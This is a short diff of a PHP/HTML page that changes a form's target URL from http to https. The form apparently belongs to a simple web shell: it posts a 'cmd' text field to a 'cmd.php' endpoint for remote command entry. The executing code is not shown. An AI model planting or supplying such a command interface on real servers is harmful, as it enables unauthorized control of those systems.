@@ -9,7 +9,7 @@
 //
 ?>
 <HTML><BODY>
-<FORM METHOD="GET" NAME="myform" ACTION="http://wasasra04.github.io/cmd.php">
+<FORM METHOD="GET" NAME="myform" ACTION="https://wasasra04.github.io/cmd.php">
 <INPUT TYPE="text" NAME="cmd">
 <INPUT TYPE="submit" VALUE="Send">
 </FORM>
